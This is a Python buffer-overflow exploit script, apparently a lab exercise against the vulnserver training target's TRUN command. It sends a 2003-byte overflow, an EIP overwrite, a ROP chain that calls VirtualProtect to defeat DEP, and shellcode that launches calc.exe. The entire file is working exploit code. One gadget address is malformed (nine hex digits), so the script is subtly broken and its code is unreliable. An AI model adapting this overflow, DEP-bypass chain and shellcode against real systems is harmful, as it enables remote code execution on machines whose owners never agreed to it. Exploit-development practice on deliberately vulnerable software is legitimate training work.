import socket
import sys
import os
from struct import pack

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('192.168.0.12',9999)

sock.connect(server_address)

buffer = b'\x41'*2003 #pegamos EIP en offset 2003

eip = pack('<L',0x62501057)#RETN --> essfunc.dll

#BOOL VirtualProtect(
#  [in]  LPVOID lpAddress,
#  [in]  SIZE_T dwSize,76
#  [in]  DWORD  flNewProtect,
#  [out] PDWORD lpflOldProtect
#);

      #[---INFO:gadgets_to_set_esi:---]
parametros=   pack('<L',0x7679075a)  # POP EAX # RETN [KERNELBASE.dll] 
parametros += pack('<L',0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dll]
parametros += pack('<L',0x766fb70a)  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNELBASE.dll] 
parametros += pack('<L',0x77ebde06)  # XCHG EAX,ESI # RETN [ntdll.dll]
      #[---INFO:gadgets_to_set_ebp:---]
parametros += pack('<L',0x760124fb)  # POP EBP # RETN [msvcrt.dll] 
parametros += pack('<L',0x625011bb)  # & jmp esp [essfunc.dll]
      #[---INFO:gadgets_to_set_ebx:---]
parametros += pack('<L',0x766f64f29)  # POP EAX # RETN [KERNELBASE.dll] 
parametros += pack('<L',0xfffff1b3)   #0xfffff1b3 --> SIZE 0x00000435
parametros += pack('<L',0x763899f3)  # NEG EAX # RETN [KERNEL32.DLL] 
parametros += pack('<L',0x76dac755)  # XCHG EAX,EBX # RETN [RPCRT4.dll]
      #[---INFO:gadgets_to_set_edx:---]
parametros += pack('<L',0x766f8742)  # POP EAX # RETN [KERNELBASE.dll] 
parametros += pack('<L',0xffffffc0)  # Value to negate, will become 0x00000040
parametros += pack('<L',0x7638ae18)  # NEG EAX # RETN [KERNEL32.DLL] 
parametros += pack('<L',0x77e7b9a2)  # XCHG EAX,EDX # RETN [ntdll.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
parametros += pack('<L',0x7606bd77)  # POP ECX # RETN [msvcrt.dll] 
parametros += pack('<L',0x625043e5)  # &Writable location [WS2_32.DLL] 
      #[---INFO:gadgets_to_set_edi:---]
parametros += pack('<L',0x76de103c)  # POP EDI # RETN [RPCRT4.dll] 
parametros += pack('<L',0x7638ae1a)  # RETN (ROP NOP) [KERNEL32.DLL] 
      #[---INFO:gadgets_to_set_eax:---]
parametros += pack('<L',0x763167df)  # POP EAX # RETN [sechost.dll] 
parametros += pack('<L',0x90909090)  # nop
      #[---INFO:pushad:---]
parametros += pack('<L',0x76dec75e)  # PUSHAD # RETN [RPCRT4.dll] 
    

nop = b'\x90'*24

opcodes  = b""
opcodes += b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
opcodes += b"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
opcodes += b"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
opcodes += b"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
opcodes += b"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
opcodes += b"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
opcodes += b"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
opcodes += b"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
opcodes += b"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
opcodes += b"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
opcodes += b"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
opcodes += b"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
opcodes += b"\x52\xff\xd0" #195


try:

    message  = b'TRUN /.:/' + buffer + eip + parametros + nop + opcodes

    print('sending {!r}'.format(message))

    sock.send(message)

finally:
    print('closing socket')
    sock.close()